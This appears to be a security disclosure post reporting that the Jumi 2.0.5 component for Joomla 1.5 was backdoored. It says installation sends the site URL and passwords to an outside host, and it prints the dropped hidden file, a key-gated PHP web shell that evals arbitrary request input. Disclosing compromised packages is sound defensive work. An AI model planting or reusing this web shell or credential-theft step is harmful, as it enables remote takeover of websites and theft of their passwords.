Subject: com_jumi / jumi 2.0.5 for joomla 1.5 backdoored

Summary: another backdoored joomla component (yawn)

Application: Jumi, a joomla component

About Jumi:
  Jumi is the set of custom code extensions for Joomla! 1.0.x and 1.5.x in
  their native modes. Since 2006 more then 200.000 downloads.  With Jumi you
  can include php, html, javascript scripts into the modules position,
  articles, category or section descriptions, or into your own custom made
  component pages.
Fun snippet from the release_notes.txt:
  Changes:
    - Fixed: security vulnerability
Vendor notified:
  *.cz .. I looked at the fun pictures on the "about us" screen, and
left it at that.
  Joomla?  A CC of this mail on their "STRIKE TEAM" form (are you
afraid of e-mail gentlemen?)

The installation sends your joomla URL and passwords to
http://my-wnl.org/index.php and drops the following file:

  modules/mod_mainmenu/tmpl/.config.php

Which says that the loveless individual who did the backdooring
doesn't like to share (c'mon man, give a bit):

<?php
if(empty ($_REQUEST['key']) ||
sha1(md5($_REQUEST['key']))!='0b6045b268cf676864a27d9663cee0a634431467'){header("HTTP/1.0
404 Not Found"); exit();}
header("Content-Type: Text/Plain");
eval(stripslashes($_REQUEST['php']));
 ?>
